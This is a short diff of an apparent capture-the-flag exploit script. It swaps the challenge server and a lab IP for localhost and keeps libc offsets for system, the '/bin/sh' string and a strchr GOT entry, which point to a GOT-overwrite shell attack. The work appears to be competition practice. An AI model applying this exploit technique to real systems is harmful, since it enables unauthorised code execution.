@@ -33,11 +33,15 @@ def countdown(n):
   return
 
 if sys.argv[1] == 'r':
-  HOST, PORT = "wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me", 2606
+  # HOST, PORT = "wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me", 2606
+  # offset_system  = 0x40190  # x86
+  # offset_binsh   = 0x160a24 # x86
+  HOST, PORT = "localhost", 2606
   offset_system  = 0x40190  # x86
   offset_binsh   = 0x160a24 # x86
 else:
-  HOST, PORT = "192.168.164.134", 2606
+  # HOST, PORT = "192.168.164.134", 2606
+  HOST, PORT = "localhost", 2606
   offset_system  = 0x40190  # x86
   offset_binsh   = 0x160a24 # x86
 offset_got_strchr = 0x505c
